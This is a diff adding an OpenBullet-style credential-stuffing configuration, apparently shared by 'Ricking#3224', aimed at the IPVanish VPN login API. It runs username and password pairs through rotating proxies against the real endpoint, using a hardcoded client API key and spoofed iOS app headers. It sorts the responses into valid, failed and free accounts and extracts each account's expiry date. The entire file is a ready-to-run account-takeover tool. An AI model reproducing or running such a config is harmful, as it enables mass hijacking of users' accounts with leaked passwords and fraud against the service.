@@ -1,0 +1,66 @@
+[SETTINGS]
+{
+  "Name": "Ipvanish.com",
+  "SuggestedBots": 50,
+  "MaxCPM": 0,
+  "LastModified": "2021-02-26T19:58:55.2321001+03:30",
+  "AdditionalInfo": "Ricking#3224",
+  "Author": "Ricking#3224",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://api.ipvanish.com/api/v3/login" 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\",\"os\":\"iOS_12_5_1\",\"api_key\":\"185f600f32cee535b0bef41ad77c1acd\",\"client\":\"IPVanishVPN_iOS_3.7.1_54307\",\"uuid\":\"2FE088DA-948F-4EFA-BF6D-72E584B6B109\"}" 
+  CONTENTTYPE "application/json" 
+  SECPROTO TLS12 
+  HEADER "Host: api.ipvanish.com" 
+  HEADER "Accept: */*" 
+  HEADER "X-Client-Version: 3.7.1_54307" 
+  HEADER "X-Platform-Version: 12_5_1" 
+  HEADER "Accept-Encoding: br, gzip, deflate" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "User-Agent: IPVanishVPN/54307 CFNetwork/978.0.7 Darwin/18.7.0" 
+  HEADER "Connection: keep-alive" 
+  HEADER "X-Platform: iOS" 
+  HEADER "X-Client: IPVanishVPN" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<RESPONSECODE>" EqualTo "200" 
+    KEY "{\"email\":\"" 
+  KEYCHAIN Failure OR 
+    KEY "The username or password provided is incorrect" 
+    KEY "incorrect" 
+    KEY "<RESPONSECODE>" EqualTo "401" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "\"account_type\":3" 
+
+PARSE "<SOURCE>" LR "access_expire_epoch\":" "}" -> VAR "T1" 
+
+FUNCTION UnixTimeToISO8601 "<T1>" -> VAR "T2" 
+  
